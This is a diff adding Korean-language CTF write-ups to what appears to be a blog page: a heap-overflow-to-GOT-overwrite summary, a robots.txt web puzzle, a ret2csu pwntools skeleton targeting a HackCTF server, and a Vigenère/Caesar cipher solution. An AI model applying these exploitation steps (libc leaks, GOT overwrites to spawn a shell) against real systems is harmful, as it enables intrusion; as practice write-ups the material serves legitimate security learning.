@@ -541,3 +541,62 @@ unsigned int __cdecl update_desc(unsigned __int8 a1)
 포인터가 손상되면 `display_location` 호출이 힙이나 libc 주소를 누출하고, 후속 `update_desc`가 임의의 주소에 쓸 수 있게 된다 — GOT 덮어쓰기나 유사한 기법으로 셸로 실행 흐름을 바꿀 수 있다.
 
 정확한 페이로드는 libc 버전과 런타임 힙 레이아웃에 따라 다르며, 일반적인 프리미티브는 다음과 같다: **힙 오버플로우 → 포인터 손상 → 임의 쓰기 → GOT 덮어쓰기 → 셸**.
+
+---
+
+## / (Hidden Flag)
+
+웹 문제. 사이트에 접근하면 로봇 사진만 주어진다.
+
+![/ 문제 페이지 — 로봇 사진과 숨겨진 플래그](/images/writeups/hackctf/slash-hidden-flag.png)
+
+문제 이름이 `/`이고 로봇 사진이라는 힌트에서 `robots.txt`에 접근한다.
+
+```
+User-agent: *
+Disallow: /robot_flag/
+```
+
+해당 경로(`/robot_flag/`)로 접근하면 플래그가 나온다.
+
+---
+
+## RTC (Return to CSU)
+
+x64 ret2csu 기법 문제. `write`로 GOT를 누출하고, `read`로 `/bin/sh`와 시스템 주소를 입력하여 셸을 획득한다.
+
+![RTC 바이너리 — csu_init/csu_call 가젯을 활용한 ret2csu](/images/writeups/hackctf/rtc-binary.png)
+
+```python
+from pwn import *
+
+p = remote("ctf.j0n9hyun.xyz", 3025)
+e = ELF("./rtc")
+libc = ELF("./libc.so.6")
+
+read_plt = e.plt['read']
+read_got = e.got['read']
+write_plt = e.plt['write']
+write_got = e.got['write']
+
+csu_init = 0x4006ba
+csu_call = 0x4006a0
+bss = 0x601060
+
+# csu_call(write(1, read_got, 8)) → libc 주소 누출
+# csu_call(read(0, bss, 8)) → /bin/sh 입력
+# csu_call(read(0, write_got, 8)) → GOT 덮어쓰기
+# csu_call(write(bss)) → 셸 실행
+```
+
+---
+
+## Smooth CipherText
+
+비즈네르 + 카이사르 암호 조합 문제.
+
+![비즈네르 암호 도구로 1차 복호화](/images/writeups/hackctf/smooth-cipher-vigenere.png)
+
+1차로 비즈네르 암호 도구로 복호화하면 플래그 부분이 완전히 해독되지 않는다. 해당 부분만 카이사르 암호로 다시 시도한다.
+
+![카이사르 암호로 플래그 부분 2차 복호화](/images/writeups/hackctf/smooth-cipher-caesar.png)
